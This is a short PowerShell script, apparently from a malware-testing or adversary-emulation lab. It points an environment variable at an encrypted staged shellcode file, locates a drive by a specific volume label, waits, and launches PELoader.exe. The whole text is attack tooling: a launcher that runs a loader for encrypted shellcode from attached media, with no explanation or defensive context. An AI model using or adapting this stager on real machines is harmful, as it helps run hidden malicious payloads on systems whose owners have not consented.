$Env:hagrid="ghost staged.shc.exe.enc";
$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-d065c789ca4aede" | foreach { $_.DeviceID });
cd $device;
sleep 10;
.\PELoader.exe
